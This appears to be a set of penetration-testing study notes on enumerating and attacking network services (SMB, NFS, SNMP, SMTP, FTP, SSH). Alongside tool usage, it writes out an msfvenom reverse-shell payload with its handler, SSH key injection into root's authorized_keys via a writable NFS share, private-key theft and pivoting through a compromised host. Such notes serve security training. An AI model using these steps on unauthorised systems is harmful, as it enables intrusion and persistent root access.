# Network Services

## 0. Keep in Mind

* Don't assume just because a protocol is supposed to be on a certain port, it will be. Scan all ports.
* Always try to enumerate service type and version numbers.
* Can you login without credentials?

  * SMB NULL sessions
  * FTP Anonymous
* Can you brute-force the login credentials?
* Once logged in, can you read, write, or execute?
* If a protocol doesn't let you execute a file, can you put it somewhere else where you can?
* Look for web servers and try chaining vulnerabilities, like Local File Inclusion (LFI).
* Try Netcat to connect to a service. If you don't find anything after connecting, does it require a specific or protocol-compliant request?

## 1. SMB - Server Message Block

**Default Port:**

* 139 -> `netbios-ssn`
* 445 -> `microsoft-ds`

### Some Default Shares

* `C$` -> The C drive of the remote host.
* `ADMIN$` -> Provides access to the Windows installation directory.
* `IPC$` -> Used for inter-process communication.

### Key points to consider

* Can I access SMB as a guest?
* Can I brute-force usernames and passwords?
* Can I read from or write to shares once I have access?
* If I can write to a share, can I access it to execute a shell?

### **Useful tools**

**smbclient:**

```bash
# Discovering shares
smbclient -L //[Target] --option='Client min protocol=NT1'

# Accessing a share
smbclient //[Target]/[Share]

# Accessing a share with authentication
smbclient //[Target]/[Share] -U [Username]
```

It supports `put [FILE]` and `get [FILE]` to upload or download files.

**NSE:**

Some useful Nmap scripts include `smb-enum*`, `smb-os*`, and `smb-vuln*`.

```bash
nmap --script=smb-enum* [Target]
```

**mount:**

Used to mount SMB shares locally using the CIFS filesystem.

```bash
sudo mount -t cifs //[Target]/[Share] /mnt -o username=''
```

This mounts the remote SMB share to the local `/mnt` directory, allowing you to interact with it like a normal local folder.

**rpcclient:**

`rpcclient` is for interacting with MSRPC (Microsoft Remote Procedure Call) services—enumerating users, groups, SIDs, domain info, etc.—not for browsing shares like `smbclient`. Different tool, different layer. Enumeration isn’t one hammer; it’s a layered dissection of the target’s exposed surfaces.

You can use `help` after logging in to view available commands.

```bash
rpcclient -U "" [TARGET]
```

**enum4linux:**

Used to enumerate information from Windows and Samba systems via SMB. It automates common enumeration tasks such as extracting users, groups, shares, password policies, and domain information.

```bash
enum4linux [Target]

# Aggressive / all enumeration options
enum4linux -a [Target]
```

Think of `enum4linux` as a wrapper script that chains together tools like `rpcclient`, `smbclient`, and `nmblookup`. It’s convenience, not magic. Great for quick reconnaissance, but manual enumeration often reveals more when you slow down and probe deliberately.

### **Scenario**

* The web server was running `.asp` and allowed file uploads via `SMB`, which was directly accessible from the web server.
* We uploaded an `.asp` reverse shell payload via `SMB`.
  Payload generated using:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.5 LPORT=4444 -f asp > shell.asp
```

* Started a listener using:

```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST=192.168.3.5; set LPORT=4444; run -j"
```

* Accessed the uploaded `shell.asp` through the browser to trigger execution.
* Received a reverse shell (Meterpreter session).

---

## 2. NFS - Network File System

**Default Port:**

* 2049 and 111 -> `NFSv3`
* 2049 -> `NFSv4`

**rpcinfo:**

* To check if NFS is in use. (Not just for NFS)

```bash
rpcinfo -p [Target]
```

**showmount:**

```bash
showmount -e [Target]
```

**mount:**

```bash
mount -t nfs [Target]:/[Shares] [Path to mount the point]

# Example (mounts the root directory)
mount -t nfs 192.168.3.7:/ /mnt
```

> **Note:** If we can write remote host, target `ssh`.

### **Scenario - SSH Key Injection via Writable NFS Share**

* NFS service is running
* The root directory is exposed
* The share is writable
* SSH is also running
* SSH allows login using a key file

**Step 1: Generate an SSH Key Pair:**

```bash
ssh-keygen
```

This creates:

* `~/.ssh/id_rsa` (private key)
* `~/.ssh/id_rsa.pub` (public key)

**Step 2: Add the Public Key to the Target:**

Since the NFS share exposes the root directory and is writable, append your public key to the target’s `authorized_keys`.

```bash
# Assumes the NFS share is mounted at /mnt
cat ~/.ssh/id_rsa.pub >> /mnt/root/.ssh/authorized_keys
```

This allows authentication as `root` using your private key.

**Step 3: Connect via SSH:**

```bash
ssh root@192.168.3.7
```

**If You Encounter This Error:**

```bash
Unable to negotiate with 192.168.3.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

This means the server is using legacy host key algorithms (`ssh-rsa`, `ssh-dss`).
Modern OpenSSH clients (8+) disable these by default because they are considered weak.

Temporary Fix (Command-Line Options)

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o HostKeyAlgorithm=+ssh-rsa \
    -o PubKeyAcceptedKeyTypes=+ssh-rsa \
    root@192.168.3.7
```

Permanent Fix (SSH Client Configuration): Add the following to your SSH client config file: `~/.ssh/config`

```conf
Host 192.168.3.7
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    HostKeyAlgorithm +ssh-rsa
    PubKeyAcceptedKeyTypes +ssh-rsa
```

This ensures compatibility with legacy SSH servers without needing to specify options each time.

>**Note:**
>
> * `HostKeyAlgorithms` and `PubkeyAcceptedAlgorithms` are the modern option names.
> * `HostKeyAlgorithm` and `PubKeyAcceptedKeyTypes` are older names still accepted in many environments.
> * Limit this configuration to specific legacy hosts only. Enabling weak algorithms globally is a bad practice.

### **Approach 2: Use Existing Private Key**

If the NFS share exposes the root SSH directory and contains an existing private key (e.g., `id_rsa`), copy it locally:

```bash
# Assumes NFS share is mounted at /mnt
cp /mnt/root/.ssh/id_rsa .
```

Private keys must have strict permissions, otherwise SSH will refuse to use them:

```bash
chmod 600 id_rsa
```

Connect using the key:

```bash
ssh -i id_rsa root@192.168.3.7
```

---

## 3. SNMP – Simple Network Management Protocol

**Default Ports:**

* `161/UDP` → Requests / Queries
* `162/UDP` → TRAP (notifications from agent to manager)

SNMP v1 and v2 use plaintext **community strings** for authentication (e.g., `public`, `private`).
SNMP v3 uses encrypted authentication with username and password.

### Enumerating SNMP

```bash
sudo nmap -sU -p 161 --script=snmp-win32-users [TARGET]
```

```bash
# Enumerate community strings
onesixtyone -c [WORDLIST] [TARGET]
```

```bash
# Automated enumeration
snmp-check [TARGET]
```

```bash
# Walk all OIDs
snmpwalk -v [VERSION] -c [COMMUNITY] [TARGET]
```

```bash
# Query specific OID
snmpwalk -v [VERSION] -c [COMMUNITY] [TARGET] [OID]
```

**Other useful tools:**
`snmpget`, `snmpset`, `snmptrap`

### Exploitating SNMP

Check if SNMP is writable:

```bash
snmpcheck -w [TARGET]
```

If writable:

* Use Metasploit module:

```bash
use linux/snmp/net_snmpd_rev_access
```

* Set SNMP object values:

```bash
use scanner/snmp/snmp_set
```

Writable SNMP can allow command execution or shell access depending on configuration.

---

## 4. SMTP – Simple Mail Transfer Protocol

**Default Port:** 25

### Enumerating SMTP

```bash
nmap -p 25 --script=smtp* [TARGET]
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t [TARGET]
```

`VRFY` attempts to validate existing users on the mail server.

### Manually Interacting with SMTP

```bash
# Connect to SMTP server
nc 192.168.3.7 25
```

Basic email flow:

```bash
HELO attacker.local
MAIL FROM:<sender@example.com>
RCPT TO:<recipient@example.com>
DATA
To: recipient@example.com
From: sender@example.com
Subject: Test

Message body goes here.
.
```

`.` on a new line indicates the end of the message.

Use `HELP` to list supported SMTP commands after connecting.

### HELO / EHLO in SMTP

After connecting to an SMTP server (usually on port 25), the client must introduce itself using:

```bash
HELO hostname
# or the modern version:
EHLO hostname
```

* **HELO** → Basic SMTP greeting (legacy command).
* **EHLO** → Extended greeting; enables advanced features like authentication (`AUTH`) and encryption (`STARTTLS`).

**The hostname provided is simply an identifier and is not verified by the server.**

`EHLO` is preferred during enumeration because the server response lists supported capabilities.

### Using a file as input for SMTP commands

```bash
nc 192.168.3.7 25 < email.txt
```

This sends all commands from `email.txt` directly to the SMTP server.

**Example `email.txt`:**

```txt
HELO attacker.local
MAIL FROM:<sender@example.com>
RCPT TO:<recipient@example.com>
DATA
Subject: Test

Hello from Netcat
.
QUIT
```

Useful for automating SMTP interaction without typing commands manually.

---

## 5. FTP – File Transfer Protocol

**Default Port:** 21

FTP is unencrypted while SFTP is encrypted and secure.

### Enumeration

```bash
nmap -p 21 -sC -sV [TARGET]
```

**General Things to Check:**

* Check for anonymous user login
* Check for exploits related to the service or its version
* Check for `root` if the host OS is Linux and `admin` for Windows and others

### Interacting with FTP

```bash
# Logging in
ftp [USER]@[HOST]

# Examples
ftp root@192.168.3.7
ftp anonymous@192.168.3.7
```

Common commands:

```bash
ls              # List files
cd [dir]        # Change directory
get [file]      # Download file
put [file]      # Upload file
bye             # Exit session

ascii           # ascii mode for Text files
binary          # binary mode for Non-text files
```

Use `binary` when transferring executables, archives, or images to avoid corruption.

---

## 6. SSH – Secure Shell

**Default Port:** 22

* SSH provides encrypted remote access and replaced Telnet.
* Supports authentication via password or key (`ssh-keygen`)
* Allows file transfer using `scp` and `sftp`
* Provides a stable shell with features like `TAB ⭾` completion and command history, unlike basic reverse shells

### Connecting via SSH

```bash
ssh [USER]@[HOST]

# Examples
ssh root@192.168.3.7

# Execute Command Without Interactive Login
ssh root@192.168.3.7 [COMMAND]

ssh user@192.168.3.7 -t bash
```

* `-t` -> Forces pseudo-terminal allocation. Useful for bypassing restricted shells or executing interactive commands.

## SSH Port Forwarding

This is not an exploitation method. It assumes SSH credentials are already compromised.

First, identify internal systems the compromised host has communicated with:

```bash
arp -e
```

If an internal web server exists (e.g., `10.10.10.5:80`), forward the port via the compromised system:

```bash
ssh -L 1234:10.10.10.5:80 root@192.168.3.7
```

**Explanation:**

* `1234` → Attacker’s local port
* `10.10.10.5:80` → Internal target web server
* `192.168.3.7` → Compromised SSH host (relay)

You can now access the internal web server from the attacker machine:

```txt
http://127.0.0.1:1234
```

### Dynamic Port Forwarding (SOCKS Proxy)

Creates a SOCKS proxy to access internal network services and SOCKS proxies do not support ICMP (ping).

```bash
ssh -D 127.0.0.1:9050 root@192.168.3.7 -fN
```

**Options:**

* `-D` → Creates SOCKS proxy on local port 9050
* `-f` → Runs in background
* `-N` → No command execution

Access internal services using proxychains:

```bash
proxychains curl -v [URL]
```

**Note:** The port `9050` is commonly used because it is the default SOCKS proxy port in ProxyChains, but any available local port can be used.

Example:

```bash
ssh -D 127.0.0.1:1080 root@192.168.3.7 -fN
```

If a different port is used, update the ProxyChains configuration file accordingly:

`/etc/proxychains4.conf` or `/etc/proxychains.conf`

Modify the SOCKS proxy entry:

```proxychain.conf
socks5 127.0.0.1 1080
```

### Differences

| Feature      | Local Port Forwarding                                                 | Dynamic Port Forwarding                                          |
| ------------ | --------------------------------------------------------------------- | ---------------------------------------------------------------- |
| Function     | Forwards one specific local port to one specific remote host and port | Creates a SOCKS5 proxy to access multiple remote hosts and ports |
| Scope        | Single service per port                                               | Multiple services through one proxy                              |
| Flexibility  | Static (fixed destination)                                            | Dynamic (destination chosen at runtime)                          |
| Requirement  | Only SSH                                                              | SSH and ProxyChains (or SOCKS-aware tools)                       |
| Ports Needed | One port per service                                                  | One port for all services                                        |

---
---
